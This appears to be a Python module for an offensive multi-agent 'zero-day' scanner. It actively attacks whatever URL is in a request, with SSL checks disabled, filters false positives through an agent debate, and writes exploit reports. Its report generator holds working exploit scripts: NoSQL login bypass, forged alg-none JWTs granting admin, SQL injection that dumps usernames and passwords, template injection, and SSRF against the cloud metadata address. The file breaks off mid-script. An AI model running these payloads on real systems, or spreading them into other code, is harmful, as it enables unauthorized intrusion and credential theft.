from __future__ import annotations

import re
import sys
from pathlib import Path
from dataclasses import dataclass, field

from .agents import AgentTurn, build_agents
from .models import ModelAdapter, default_models, live_scanner_models, LiveScannerModel, ZeroDayFinding, ExploitPayload, ProofOfConcept
from .safety import SafetyDecision, SafetyGate

# Add tools path for hypothesis debate
sys.path.insert(0, str(Path(__file__).parent.parent.parent / "tools"))

try:
    from hypothesis_debate import (
        HypothesisDebateSystem, Hypothesis, Evidence, AgentRole, 
        HypothesisStatus, analyze_status_code
    )
    HAS_DEBATE = True
except ImportError:
    HAS_DEBATE = False


@dataclass(frozen=True)
class ZeroDayReport:
    """Report containing concrete exploits, payloads, and validated PoCs."""
    status: str
    target: str
    turns: tuple[AgentTurn, ...]
    findings: tuple[ZeroDayFinding, ...]
    final: str
    attack_phase: str


@dataclass(frozen=True)
class AttackPhase:
    phase: int
    name: str
    objectives: tuple[str, ...]
    completed: bool

    def prompt(self) -> str:
        if self.completed:
            return f"Phase {self.phase} ({self.name}) complete. Proceed to exploitation."
        goals = ", ".join(self.objectives)
        return f"Phase {self.phase} - {self.name}: Focus on {goals}"


# Legacy alias
CouncilReport = ZeroDayReport


def _extract_url(text: str) -> str | None:
    """Extract URL from text."""
    url_pattern = r'https?://[^\s<>"{}|\\^`\[\]]+'
    match = re.search(url_pattern, text)
    return match.group(0) if match else None


class ZeroDayOrchestrator:
    """Orchestrator for zero-day research with exploit development and PoC validation."""
    
    def __init__(
        self,
        models: list[ModelAdapter] | None = None,
        safety_gate: SafetyGate | None = None,
        max_rounds: int = 3,
        live_scan: bool = True,
        enable_debate: bool = True,
    ) -> None:
        self.models = models or default_models()
        self.safety_gate = safety_gate or SafetyGate()
        self.max_rounds = max_rounds
        self.live_scan = live_scan
        self.enable_debate = enable_debate and HAS_DEBATE
        self._scan_result = None
        self._debate = None
        self._payload_mode = "standard"

    def run(self, user_request: str, verbose: bool = False, enable_debate: bool | None = None, payload_mode: str = "standard") -> ZeroDayReport:
        # Override debate setting if explicitly provided
        if enable_debate is not None:
            self.enable_debate = enable_debate and HAS_DEBATE
        self.verbose = verbose
        self._payload_mode = payload_mode
        
        safety = self.safety_gate.evaluate(user_request)
        if safety.decision is SafetyDecision.REFUSE:
            return ZeroDayReport("refused", user_request, (), (), safety.safe_prompt, "blocked")

        # Check if request contains a URL for live scanning
        target_url = _extract_url(user_request)
        
        if target_url and self.live_scan:
            return self._run_live_scan(user_request, target_url)
        else:
            return self._run_offline(user_request)
    
    def _run_live_scan(self, user_request: str, target_url: str) -> ZeroDayReport:
        """Run with live active scanning against target."""
        from .scanner import ActiveScanner
        
        # Banner output
        print(f"\n[*] Starting active scan on: {target_url}")
        if self.verbose:
            print("[*] Verbose mode: ENABLED")
        print(f"[*] Payload mode: {self._payload_mode.upper()}")
        print("[*] Phase 1: Reconnaissance...")
        
        # Initialize debate system if available
        if self.enable_debate:
            self._debate = HypothesisDebateSystem(verbose=self.verbose)
            print("[*] Hypothesis Debate System: ENABLED")
        
        # Perform active scan with dynamic payloads
        # Scanner will print engine status via _log when verbose=True
        scanner = ActiveScanner(
            timeout=15, 
            verify_ssl=False, 
            verbose=True,  # Always show engine status
            payload_mode=self._payload_mode
        )
        
        # Show debate modules after scanner initialization
        if self.enable_debate:
            print("[*] Debate Start : Perintah")
            print("    [Module GPT Hypothesis ]")
            print("    [Module Claude Hypothesis ]")
        
        scan_result = scanner.scan_target(target_url)
        self._scan_result = scan_result
        
        # Show payload stats
        payload_stats = scanner.get_payload_stats()
        if payload_stats.get("total_generated", 0) > 0:
            print(f"[*] Payloads generated: {payload_stats.get('total_generated', 'N/A')}")
        
        print(f"[*] Discovered {len(scan_result.endpoints)} endpoints")
        print(f"[*] Phase 2: Vulnerability Testing...")
        print(f"[*] Found {len(scan_result.vulnerabilities)} potential vulnerabilities")
        
        # Run hypothesis debate on vulnerabilities if enabled
        if self._debate:
            print(f"\n{'='*70}")
            print("[*] HYPOTHESIS DEBATE PHASE")
            print(f"{'='*70}\n")
            self._run_vulnerability_debate(scan_result)
        
        confirmed = [v for v in scan_result.vulnerabilities if v.is_vulnerable]
        print(f"[+] Confirmed vulnerabilities: {len(confirmed)}")
        
        # Create live scanner models with scan results
        models = live_scanner_models()
        for model in models:
            model.set_scan_result(scan_result)
        
        # Run agents with live data
        context: list[AgentTurn] = []
        agents = build_agents(models)
        attack_phase = AttackPhase(1, "Live Scan", ("active reconnaissance", "vulnerability testing", "exploit validation"), False)

        for round_number in range(1, 2):  # Single round for live scan
            for agent in agents:
                print(f"[*] Running {agent.name}...")
                context.append(agent.respond(
                    user_request, 
                    context, 
                    target_url,
                    attack_phase.prompt(), 
                    round_number
                ))

        # Extract findings from scan results
        findings = self._extract_live_findings(scan_result)
        attack_phase = AttackPhase(5, "Complete", ("scan finished",), True)
        
        final = self._synthesize_live_report(target_url, context, findings, scan_result)
        status = "exploit_validated" if confirmed else "analysis_complete"
        
        return ZeroDayReport(status, target_url, tuple(context), tuple(findings), final, attack_phase.prompt())
    
    def _run_vulnerability_debate(self, scan_result):
        """Run hypothesis debate on discovered vulnerabilities."""
        if not self._debate:
            return
        
        vuln_count = len(scan_result.vulnerabilities)
        
        for i, v in enumerate(scan_result.vulnerabilities, 1):
            print(f"\n--- Processing Vulnerability {i}/{vuln_count} ---")
            
            # Analyze status code
            status_analysis = analyze_status_code(v.response.status_code)
            
            # VulnHunter proposes hypothesis
            hyp = self._debate.propose_hypothesis(
                title=f"{v.vuln_type}",
                description=f"Potential {v.vuln_type} at {v.target_url}",
                proposed_by=AgentRole.VULN_HUNTER,
                initial_evidence=Evidence(
                    type="http_response",
                    data={
                        "status_code": v.response.status_code,
                        "payload": v.payload[:100],
                        "endpoint": v.target_url
                    },
                    supports_hypothesis=True,
                    confidence=v.confidence,
                    source_agent=AgentRole.VULN_HUNTER
                )
            )
            
            # Status code analysis
            if status_analysis["confidence_modifier"] != 0:
                if status_analysis["confidence_modifier"] > 0:
                    self._debate.support_hypothesis(
                        hyp.id,
                        AgentRole.RECON,
                        Evidence(
                            type="status_code_analysis",
                            data=status_analysis,
                            supports_hypothesis=True,
                            confidence=0.6 + status_analysis["confidence_modifier"],
                            source_agent=AgentRole.RECON
                        ),
                        f"Status {v.response.status_code}: {status_analysis['security_implication']}"
                    )
                else:
                    self._debate.refute_hypothesis(
                        hyp.id,
                        AgentRole.DEVIL_ADVOCATE,
                        Evidence(
                            type="status_code_analysis",
                            data=status_analysis,
                            supports_hypothesis=False,
                            confidence=abs(status_analysis["confidence_modifier"]),
                            source_agent=AgentRole.DEVIL_ADVOCATE
                        ),
                        f"Status {v.response.status_code}: {status_analysis['security_implication']}"
                    )
            
            # Response content analysis
            body_lower = v.response.body.lower() if v.response.body else ""
            
            # Check for positive indicators (strong evidence of successful exploit)
            # These must be actual returned data, not form field labels
            positive_indicators = {
                "token": ["\"token\":", "\"jwt\":", "\"access_token\":", "\"bearer\":", "\"session\":"],
                "user_data": ["\"user\":{", "\"email\":", "\"user_id\":", "\"role\":\"admin", "\"authenticated\":true"],
                "success": ["\"success\":true", "\"status\":\"ok\"", "\"authenticated\":true", "\"logged_in\":true"],
                "sql_error": ["sql syntax", "mysql error", "sqlite error", "ora-", "pg::", "sqlstate"],
                "sensitive_data": ["\"password\":", "\"secret\":", "\"api_key\":", "\"credentials\":"],
                "data_dump": ["\"data\":[", "\"results\":[", "\"items\":[", "\"records\":["],
            }
            
            # Check for false positive indicators (signs this is NOT a real vulnerability)
            fp_indicators = {
                "login_page": [
                    "<form", "type=\"password\"", "name=\"password\"", "name=\"username\"",
                    "<input", "type=\"submit\"", "sign in", "log in", "login form",
                    "forgot password", "reset password", "remember me"
                ],
                "html_page": [
                    "<!doctype html", "<html lang=", "<head>", "<title>", "</html>",
                    "<meta charset", "<link rel=", "<script src="
                ],
                "error_page": [
                    "invalid credentials", "login failed", "unauthorized", "403 forbidden",
                    "access denied", "authentication required", "please log in"
                ],
                "generic_response": [
                    "welcome to", "homepage", "index page", "main page"
                ],
            }
            
            # Determine if this is an auth bypass type vulnerability
            is_auth_bypass = any(x in v.vuln_type.lower() for x in ["auth bypass", "nosql injection", "sql injection", "authentication"])
            
            found_positive = None
            for indicator_type, patterns in positive_indicators.items():
                if any(p in body_lower for p in patterns):
                    found_positive = indicator_type
                    break
            
            found_fp = None
            fp_confidence = 0.5
            for fp_type, patterns in fp_indicators.items():
                matches = sum(1 for p in patterns if p in body_lower)
                if matches > 0:
                    # More matches = higher FP confidence
                    if matches >= 3:
                        found_fp = fp_type
                        fp_confidence = 0.85
                        break
                    elif matches >= 2:
                        found_fp = fp_type
                        fp_confidence = 0.75
                    elif not found_fp:
                        found_fp = fp_type
                        fp_confidence = 0.6
            
            # Special check for auth bypass false positives
            if is_auth_bypass:
                # If response is HTML (not JSON/API), it's likely a false positive
                is_html_response = "<html" in body_lower or "<!doctype" in body_lower
                is_json_response = body_lower.strip().startswith("{") or body_lower.strip().startswith("[")
                
                if is_html_response and not is_json_response:
                    # Auth bypass should return JSON data, not HTML pages
                    if not found_fp:
                        found_fp = "html_page"
                    fp_confidence = max(fp_confidence, 0.8)
                    
                # If we see form elements, definitely a login page
                has_form_elements = any(x in body_lower for x in ['<form', 'type="password"', 'type="submit"'])
                if has_form_elements:
                    found_fp = "login_page"
                    fp_confidence = 0.9
                    
                # For NoSQL injection specifically, check if we actually got user data
                if "nosql" in v.vuln_type.lower():
                    has_real_user_data = any(x in body_lower for x in ['"user":{', '"_id":', '"email":', '"role":'])
                    if not has_real_user_data and found_fp:
                        fp_confidence = 0.95  # Very high confidence it's FP
            
            # Add evidence based on content analysis
            if found_positive:
                self._debate.support_hypothesis(
                    hyp.id,
                    AgentRole.POC_VALIDATOR,
                    Evidence(
                        type="content_analysis",
                        data={"indicator_type": found_positive, "found_in_body": True},
                        supports_hypothesis=True,
                        confidence=0.8 if found_positive in ["token", "user_data"] else 0.6,
                        source_agent=AgentRole.POC_VALIDATOR
                    ),
                    f"Response contains {found_positive} indicators - supports vulnerability"
                )
            
            if found_fp:
                self._debate.refute_hypothesis(
                    hyp.id,
                    AgentRole.DEVIL_ADVOCATE,
                    Evidence(
                        type="false_positive_check",
                        data={
                            "indicator_type": found_fp, 
                            "is_generic_response": True,
                            "is_auth_bypass": is_auth_bypass,
                            "has_form_elements": 'form' in body_lower
                        },
                        supports_hypothesis=False,
                        confidence=fp_confidence,
                        source_agent=AgentRole.DEVIL_ADVOCATE
                    ),
                    f"Response is {found_fp.replace('_', ' ')} (confidence: {fp_confidence:.0%}) - FALSE POSITIVE"
                )
            
            # Additional auth bypass validation
            if is_auth_bypass and not found_positive:
                # If it's supposed to be auth bypass but we found no token/user data, flag it
                self._debate.refute_hypothesis(
                    hyp.id,
                    AgentRole.DEVIL_ADVOCATE,
                    Evidence(
                        type="missing_evidence",
                        data={"expected": "token or user data", "actual": "none found"},
                        supports_hypothesis=False,
                        confidence=0.85,
                        source_agent=AgentRole.DEVIL_ADVOCATE
                    ),
                    "Auth bypass claimed but no token/user data returned - FALSE POSITIVE"
                )
            
            # Check for confirmed status
            if v.is_vulnerable:
                self._debate.support_hypothesis(
                    hyp.id,
                    AgentRole.EVIDENCE,
                    Evidence(
                        type="scanner_confirmation",
                        data={"scanner_marked_vulnerable": True, "evidence": v.evidence},
                        supports_hypothesis=True,
                        confidence=0.9,
                        source_agent=AgentRole.EVIDENCE
                    ),
                    f"Scanner confirmed: {v.evidence}"
                )
            
            # Devil's advocate challenge
            self._debate.devils_advocate_check(hyp.id)
            
            # Update vulnerability status based on debate
            evaluation = self._debate.evaluate_hypothesis(hyp.id)
            
            # Update the vulnerability confidence based on debate
            if evaluation["is_false_positive"]:
                v.is_vulnerable = False
                v.confidence = evaluation["confidence"]
                v.evidence = f"[DEBATE REFUTED] {v.evidence}"
            elif evaluation["confidence"] > 0.8:
                v.is_vulnerable = True
                v.confidence = evaluation["confidence"]
                v.evidence = f"[DEBATE VALIDATED] {v.evidence}"
        
        # Print debate summary
        print("\n")
        print("=" * 70)
        print("[*] RUNNING FINAL DEBATE SUMMARY...")
        print("=" * 70)
        import sys
        sys.stdout.flush()
        self._debate.print_debate_summary()
        sys.stdout.flush()
    
    def _extract_live_findings(self, scan_result) -> list[ZeroDayFinding]:
        """Extract findings from live scan results."""
        findings = []
        vuln_id = 1
        
        for v in scan_result.vulnerabilities:
            if not v.is_vulnerable and v.confidence < 0.5:
                continue
                
            severity = "critical" if v.confidence > 0.8 else "high" if v.confidence > 0.5 else "medium"
            
            finding = ZeroDayFinding(
                id=f"VULN-{vuln_id:03d}",
                title=v.vuln_type,
                severity=severity,
                vulnerability_class=v.vuln_type.lower().replace(" ", "_"),
                attack_vector="network",
                payloads=[
                    ExploitPayload(
                        name=f"{v.vuln_type.lower().replace(' ', '_')}_payload",
                        category=v.vuln_type.split()[0].lower(),
                        payload=v.payload,
                        target_component=v.target_url,
                        confidence=v.confidence
                    )
                ],
                poc=ProofOfConcept(
                    title=f"{v.vuln_type} PoC",
                    vulnerability_type=v.vuln_type,
                    steps=(
                        f"1. Target: {v.target_url}",
                        f"2. Send request with payload",
                        f"3. Payload: {v.payload[:100]}",
                        f"4. Observe response"
                    ),
                    payload=ExploitPayload(
                        name="poc_payload",
                        category=v.vuln_type.split()[0].lower(),
                        payload=v.payload,
                        target_component=v.target_url,
                        confidence=v.confidence
                    ),
                    expected_result="Vulnerability exploitation",
                    actual_result=f"Status {v.response.status_code}: {v.response.body[:100]}" if v.response.body else f"Status {v.response.status_code}",
                    evidence_hash=v.evidence_hash,
                    verified=v.is_vulnerable
                ),
                false_positive_checks=(
                    f"Confidence: {v.confidence * 100:.0f}%",
                    v.evidence
                ),
                validation_status="validated" if v.is_vulnerable else "potential"
            )
            findings.append(finding)
            vuln_id += 1
            
        return findings
    
    def _synthesize_live_report(self, target_url: str, context: list[AgentTurn], findings: list[ZeroDayFinding], scan_result) -> str:
        """Generate report from live scan results."""
        tech = scan_result.tech_stack
        
        # Tech stack info
        tech_info = f"""
Technology Stack:
  Server: {tech.server or 'Unknown'}
  Framework: {tech.framework or 'Unknown'}
  Language: {tech.language or 'Unknown'}
  Database: {tech.database or 'Unknown'}
"""
        
        # Endpoints discovered
        endpoints_info = "Discovered Endpoints:\n"
        for ep in scan_result.endpoints[:15]:
            endpoints_info += f"  - {ep.method} {ep.url}\n"
        if len(scan_result.endpoints) > 15:
            endpoints_info += f"  ... and {len(scan_result.endpoints) - 15} more\n"
        
        # Vulnerabilities
        confirmed = [v for v in scan_result.vulnerabilities if v.is_vulnerable]
        potential = [v for v in scan_result.vulnerabilities if not v.is_vulnerable and v.confidence > 0.3]
        
        vuln_summary = f"""
Vulnerability Summary:
  Total Tests: {len(scan_result.vulnerabilities)}
  Confirmed: {len(confirmed)}
  Potential: {len(potential)}
"""
        
        # Detailed findings
        findings_detail = ""
        for v in confirmed:
            findings_detail += f"""
[CONFIRMED] {v.vuln_type}
  URL: {v.target_url}
  Payload: {v.payload}
  Response: HTTP {v.response.status_code}
  Evidence: {v.evidence}
  Hash: {v.evidence_hash}
"""
        
        for v in potential[:5]:
            findings_detail += f"""
[POTENTIAL] {v.vuln_type}
  URL: {v.target_url}
  Confidence: {v.confidence * 100:.0f}%
  Note: {v.evidence}
"""
        
        # Agent analysis
        agent_analysis = "\n".join(
            f"\n[{turn.agent}]\n{turn.response}" 
            for turn in context
        )
        
        return f"""
================================================================================
LIVE ZERO-DAY SCAN REPORT
================================================================================
Target: {target_url}
Scan Time: {scan_result.timestamp}
Mode: ACTIVE SCANNING
{tech_info}
{endpoints_info}
{vuln_summary}
================================================================================
CONFIRMED VULNERABILITIES
================================================================================
{findings_detail if findings_detail else "No confirmed vulnerabilities found."}

================================================================================
AGENT ANALYSIS
================================================================================
{agent_analysis}

================================================================================
SCAN EVIDENCE
================================================================================
All findings include:
- HTTP request/response pairs
- Evidence hashes for verification
- Confidence scores based on response analysis
- Multiple payload variant testing

This is a LIVE SCAN RESULT - Not simulated data.
================================================================================
"""

    def _run_offline(self, user_request: str) -> ZeroDayReport:
        """Run with rule-based models (offline mode)."""
        context: list[AgentTurn] = []
        agents = build_agents(self.models)
        attack_phase = AttackPhase(1, "Reconnaissance", ("identify endpoints", "map attack surface", "detect versions"), False)

        for round_number in range(1, self.max_rounds + 1):
            for agent in agents:
                context.append(agent.respond(
                    user_request, 
                    context, 
                    user_request,
                    attack_phase.prompt(), 
                    round_number
                ))

            attack_phase = self._advance_phase(round_number, context)
            if attack_phase.completed and round_number >= 2:
                break

        findings = self._extract_findings(context)
        final = self._synthesize_exploit_report(user_request, context, findings, attack_phase)
        status = "exploit_validated" if any(f.validation_status == "validated" for f in findings) else "analysis_complete"
        return ZeroDayReport(status, user_request, tuple(context), tuple(findings), final, attack_phase.prompt())

    def _advance_phase(self, round_number: int, context: list[AgentTurn]) -> AttackPhase:
        transcript = "\n".join(turn.response.casefold() for turn in context)
        
        phases = [
            ("reconnaissance", ("endpoint", "version", "stack", "parameter")),
            ("vulnerability analysis", ("injection", "bypass", "payload", "vulnerability")),
            ("exploit development", ("exploit", "code", "python", "request")),
            ("poc validation", ("confirmed", "verified", "status:", "evidence")),
            ("evidence collection", ("hash", "screenshot", "log", "severity")),
        ]
        
        completed_count = 0
        for _, markers in phases:
            if sum(1 for m in markers if m in transcript) >= 2:
                completed_count += 1
        
        if completed_count >= 4:
            return AttackPhase(5, "Complete", ("all phases done",), True)
        
        current_phase = min(completed_count + 1, 5)
        phase_info = phases[current_phase - 1]
        return AttackPhase(current_phase, phase_info[0].title(), phase_info[1], False)

    def _extract_findings(self, context: list[AgentTurn]) -> list[ZeroDayFinding]:
        """Extract structured findings from agent responses based on actual evidence."""
        findings: list[ZeroDayFinding] = []
        vuln_id = 1
        
        # Parse VulnHunter output for actual vulnerabilities
        for turn in context:
            if "VulnHunter" not in turn.agent:
                continue
            
            response = turn.response
            
            # Look for vulnerability analysis patterns (including rule-based agent outputs)
            analysis_patterns = [
                # Explicit confirmations
                "[CONFIRMED]",
                "[VALIDATED]", 
                "confirmed vulnerability",
                "vulnerability confirmed",
                "is_vulnerable: True",
                "is_vulnerable=True",
                "CRITICAL FINDING",
                "HIGH FINDING",
                "successfully exploited",
                "exploitation successful",
                # Rule-based agent patterns
                "Vulnerability Analysis:",
                "Confidence: High",
                "Confidence: Medium",
                "pattern matches known",
                "Payload:",
                "vulnerability pada",  # Indonesian
                "injection pada",
            ]
            
            has_analysis = any(p.lower() in response.lower() for p in analysis_patterns)
            
            if not has_analysis:
                # No vulnerability analysis in this turn
                continue
            
            # Extract actual vulnerability types from response
            vuln_mappings = [
                # (keywords, vuln_title, vuln_class, severity)
                (["sql injection", "sqli", "sql inj"], "SQL Injection", "sql_injection", "critical"),
                (["nosql injection", "mongodb injection", "nosql auth bypass", "nosql injection pada"], "NoSQL Injection", "nosql_injection", "critical"),
                (["xss", "cross-site scripting", "script injection"], "Cross-Site Scripting (XSS)", "xss", "high"),
                (["jwt", "algorithm confusion", "alg:none", "none algorithm", "jwt algorithm"], "JWT Algorithm Confusion", "jwt_bypass", "critical"),
                (["ssti", "template injection", "jinja", "twig"], "Server-Side Template Injection", "ssti", "critical"),
                (["ssrf", "server-side request"], "Server-Side Request Forgery", "ssrf", "high"),
                (["lfi", "local file inclusion", "path traversal", "directory traversal"], "Local File Inclusion", "lfi", "high"),
                (["rce", "remote code execution", "command injection", "os command"], "Remote Code Execution", "rce", "critical"),
                (["xxe", "xml external entity"], "XML External Entity", "xxe", "high"),
                (["auth bypass", "authentication bypass", "broken auth", "type juggling"], "Authentication Bypass", "auth_bypass", "critical"),
                (["idor", "insecure direct object"], "Insecure Direct Object Reference", "idor", "medium"),
                (["open redirect", "url redirect"], "Open Redirect", "redirect", "medium"),
                (["crlf injection", "header injection"], "CRLF Injection", "crlf", "medium"),
                (["prototype pollution"], "Prototype Pollution", "prototype", "high"),
                (["deserialization", "pickle", "unserialize"], "Insecure Deserialization", "deserial", "critical"),
            ]
            
            response_lower = response.lower()
            found_vulns = set()  # Track which vulns we've already added to avoid duplicates
            
            for keywords, title, vuln_class, severity in vuln_mappings:
                # Skip if we already found this vuln type
                if vuln_class in found_vulns:
                    continue
                
                # Check if this vulnerability type is mentioned 
                if any(kw in response_lower for kw in keywords):
                    # Look for evidence in context around the keyword
                    evidence = self._extract_evidence_from_response(response, keywords)
                    
                    if evidence:
                        found_vulns.add(vuln_class)
                        finding = ZeroDayFinding(
                            id=f"VULN-{vuln_id:03d}",
                            title=title,
                            severity=severity,
                            vulnerability_class=vuln_class,
                            attack_vector="network",
                            payloads=[
                                ExploitPayload(
                                    name=f"{vuln_class}_payload",
                                    category=vuln_class.split("_")[0],
                                    payload=evidence.get("payload", "See report for details"),
                                    target_component=evidence.get("target", "Target endpoint"),
                                    confidence=evidence.get("confidence", 0.7)
                                )
                            ],
                            poc=ProofOfConcept(
                                title=f"{title} PoC",
                                vulnerability_type=title,
                                steps=tuple(evidence.get("steps", [
                                    "1. Identify vulnerable endpoint",
                                    "2. Craft exploit payload",
                                    "3. Send request",
                                    "4. Verify exploitation"
                                ])),
                                payload=ExploitPayload(
                                    name="poc_payload",
                                    category=vuln_class.split("_")[0],
                                    payload=evidence.get("payload", "See report"),
                                    target_component=evidence.get("target", "Target"),
                                    confidence=evidence.get("confidence", 0.7)
                                ),
                                expected_result="Vulnerability exploitation",
                                actual_result=evidence.get("result", "See scan output"),
                                evidence_hash=evidence.get("hash", "pending"),
                                verified=evidence.get("verified", False)
                            ),
                            false_positive_checks=tuple(evidence.get("fp_checks", ["manual verification required"])),
                            validation_status="validated" if evidence.get("verified") else "potential"
                        )
                        findings.append(finding)
                        vuln_id += 1
        
        return findings
    
    def _extract_evidence_from_response(self, response: str, keywords: list[str]) -> dict | None:
        """Extract evidence details from agent response text."""
        import re
        
        response_lower = response.lower()
        
        # Check if there's meaningful content about this vuln type (not just a mention)
        # Look for patterns indicating actual vulnerability description
        has_content = False
        for kw in keywords:
            # Look for patterns that indicate actual finding (not just mention)
            content_patterns = [
                rf"{re.escape(kw)}.*payload",
                rf"{re.escape(kw)}.*parameter",
                rf"{re.escape(kw)}.*endpoint",
                rf"{re.escape(kw)}.*pada",
                rf"payload.*{re.escape(kw)}",
                rf"\d+\.\s*{re.escape(kw)}",  # Numbered list item
                rf"\[confirmed\].*{re.escape(kw)}",
                rf"{re.escape(kw)}.*confirmed",
                rf"{re.escape(kw)}.*vulnerable",
            ]
            for pattern in content_patterns:
                if re.search(pattern, response_lower):
                    has_content = True
                    break
            if has_content:
                break
        
        if not has_content:
            return None
        
        # Determine verification status based on explicit confirmation
        verified = any(p in response_lower for p in ["[confirmed]", "confirmed", "[validated]", "validated", "confidence: high"])
        
        evidence = {
            "verified": verified,
            "confidence": 0.85 if verified else 0.7,
            "fp_checks": ["agent analysis"] if verified else ["manual verification required"]
        }
        
        # Try to extract payload from response
        payload_patterns = [
            r'[Pp]ayload[:\s]*["\']?([^"\'\n]{5,})["\']?',
            r'[Pp]ayload[:\s]*`([^`]+)`',
            r'\{[^}]*"\$[^}]+\}',  # NoSQL-style with quotes
            r'\{[^}]*\'\$[^}]+\}',  # NoSQL-style with single quotes
            r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+',  # JWT pattern
        ]
        for pattern in payload_patterns:
            match = re.search(pattern, response)
            if match:
                evidence["payload"] = match.group(1) if match.lastindex else match.group(0)
                break
        
        # Try to extract target URL
        url_pattern = r'(https?://[^\s<>"\']+|/api/[^\s<>"\']+|/[a-zA-Z0-9_/-]+(?:\?[^\s]*)?)'
        url_match = re.search(url_pattern, response)
        if url_match:
            evidence["target"] = url_match.group(1)
        
        # Try to extract evidence hash
        hash_pattern = r'sha256:[a-f0-9]+'
        hash_match = re.search(hash_pattern, response)
        if hash_match:
            evidence["hash"] = hash_match.group(0)
        
        # Extract result if present
        result_patterns = [
            r'[Rr]esult[:\s]*([^\n]+)',
            r'[Rr]esponse[:\s]*([^\n]+)',
            r'[Ss]tatus[:\s]*(\d+)',
            r'[Cc]onfidence[:\s]*([^\n]+)',
        ]
        for pattern in result_patterns:
            match = re.search(pattern, response)
            if match:
                evidence["result"] = match.group(1).strip()
                break
        
        return evidence

    def _synthesize_exploit_report(
        self, 
        user_request: str, 
        context: list[AgentTurn], 
        findings: list[ZeroDayFinding],
        attack_phase: AttackPhase
    ) -> str:
        """Generate final report with concrete payloads, exploits, and PoCs."""
        
        # Build findings section
        findings_text = ""
        for f in findings:
            payloads_text = "\n".join(
                f"    - {p.name}: {p.payload}" for p in f.payloads
            )
            poc_text = ""
            if f.poc:
                steps = "\n".join(f"      {s}" for s in f.poc.steps)
                poc_text = f"""
    PoC:
      Title: {f.poc.title}
      Steps:
{steps}
      Expected: {f.poc.expected_result}
      Actual: {f.poc.actual_result}
      Evidence Hash: {f.poc.evidence_hash}
      Verified: {f.poc.verified}"""
            
            fp_checks = ", ".join(f.false_positive_checks)
            findings_text += f"""
  [{f.id}] {f.title}
    Severity: {f.severity.upper()}
    Class: {f.vulnerability_class}
    Vector: {f.attack_vector}
    Validation: {f.validation_status.upper()}
    
    Payloads:
{payloads_text}
{poc_text}
    
    False Positive Checks: {fp_checks}
"""

        # Build agent transcript
        agent_transcript = "\n".join(
            f"  [{turn.agent} - Round {turn.round_number}]\n  {turn.response}\n" 
            for turn in context
        )

        # Build exploit code section dynamically based on actual findings
        exploit_code = self._generate_exploit_code(findings)
        
        # Build recommendations based on actual findings
        recommendations = self._generate_recommendations(findings)

        return f"""
================================================================================
ZERO-DAY RESEARCH REPORT
================================================================================
Target: {user_request}
Status: {attack_phase.name}
Findings Count: {len(findings)}
Validated Exploits: {sum(1 for f in findings if f.validation_status == 'validated')}

================================================================================
VALIDATED FINDINGS
================================================================================
{findings_text if findings_text else "No confirmed vulnerabilities found during this scan."}
{exploit_code}

================================================================================
AGENT ANALYSIS TRANSCRIPT  
================================================================================
{agent_transcript}

================================================================================
EVIDENCE SUMMARY
================================================================================
{self._generate_evidence_summary(findings)}

================================================================================
RECOMMENDATION
================================================================================
{recommendations if recommendations else "Continue monitoring and testing other attack vectors."}

Report generated based on actual scan evidence.
"""

    def _generate_exploit_code(self, findings: list[ZeroDayFinding]) -> str:
        """Generate exploit code only for vulnerabilities that were actually found."""
        if not findings:
            return ""
        
        code_sections = []
        code_sections.append("""
================================================================================
EXPLOIT CODE
================================================================================
""")
        
        vuln_classes = {f.vulnerability_class for f in findings}
        
        if "nosql_injection" in vuln_classes:
            nosql_finding = next((f for f in findings if f.vulnerability_class == "nosql_injection"), None)
            target = nosql_finding.payloads[0].target_component if nosql_finding and nosql_finding.payloads else "/api/login"
            code_sections.append(f'''
### NoSQL Injection Exploit (Python)
```python
import requests
import json

TARGET = "http://target{target}"

def exploit_nosql_bypass():
    payloads = [
        {{"username": {{"$gt": ""}}, "password": {{"$gt": ""}}}},
        {{"username": {{"$ne": None}}, "password": {{"$ne": None}}}},
        {{"username": {{"$exists": True}}, "password": {{"$exists": True}}}},
    ]
    
    for payload in payloads:
        r = requests.post(TARGET, json=payload, headers={{"Content-Type": "application/json"}})
        if r.status_code == 200 and "token" in r.text:
            print(f"[+] SUCCESS with payload: {{json.dumps(payload)}}")
            return r.json().get("token")
    return None

if __name__ == "__main__":
    token = exploit_nosql_bypass()
    if token:
        print(f"[+] Token obtained: {{token}}")
```
''')
        
        if "jwt_bypass" in vuln_classes or "authentication_bypass" in vuln_classes:
            code_sections.append('''
### JWT Algorithm Confusion Exploit (Python)
```python
import base64
import json
import requests

def forge_jwt(payload_data):
    header = {"alg": "none", "typ": "JWT"}
    header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
    payload_b64 = base64.urlsafe_b64encode(json.dumps(payload_data).encode()).decode().rstrip("=")
    return f"{header_b64}.{payload_b64}."

def exploit_jwt_none():
    forged_token = forge_jwt({"user": "admin", "role": "superuser"})
    print(f"[+] Forged token: {forged_token}")
    
    r = requests.get("http://target/api/profile", headers={"Authorization": f"Bearer {forged_token}"})
    print(f"[+] Response: {r.status_code}")
    return r

if __name__ == "__main__":
    exploit_jwt_none()
```
''')
        
        if "sql_injection" in vuln_classes:
            sqli_finding = next((f for f in findings if f.vulnerability_class == "sql_injection"), None)
            target = sqli_finding.payloads[0].target_component if sqli_finding and sqli_finding.payloads else "/search"
            code_sections.append(f'''
### SQL Injection Exploit (Python)
```python
import requests

TARGET = "http://target{target}"

def exploit_sqli():
    payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT null,username,password FROM users--",
    ]
    
    for payload in payloads:
        r = requests.get(TARGET, params={{"q": payload}})
        if "error" not in r.text.lower() and r.status_code == 200:
            print(f"[+] Potential SQLi with: {{payload}}")
            print(f"[+] Response: {{r.text[:200]}}")
    return

if __name__ == "__main__":
    exploit_sqli()
```
''')
        
        if "ssti" in vuln_classes:
            code_sections.append('''
### SSTI Exploit (Python)
```python
import requests

TARGET = "http://target/template"

def exploit_ssti():
    payloads = [
        "{{7*7}}",
        "{{config}}",
        "{{self.__class__.__mro__[2].__subclasses__()}}",
    ]
    
    for payload in payloads:
        r = requests.get(TARGET, params={"input": payload})
        if "49" in r.text or "config" in r.text.lower():
            print(f"[+] SSTI confirmed with: {payload}")
    return

if __name__ == "__main__":
    exploit_ssti()
```
''')
        
        if "ssrf" in vuln_classes:
            code_sections.append('''
### SSRF Exploit (Python)
```python
import requests

TARGET = "http://target/fetch"

def exploit_ssrf():
    payloads = [
        "http://127.0.0.1:80",
        "http://localhost:22",
        "http://169.254.169.254/latest/meta-data/",
    ]
    
    for payload in payloads:
        r = requests.get(TARGET, params={"url": payload})
        print(f"[*] Testing: {payload}")
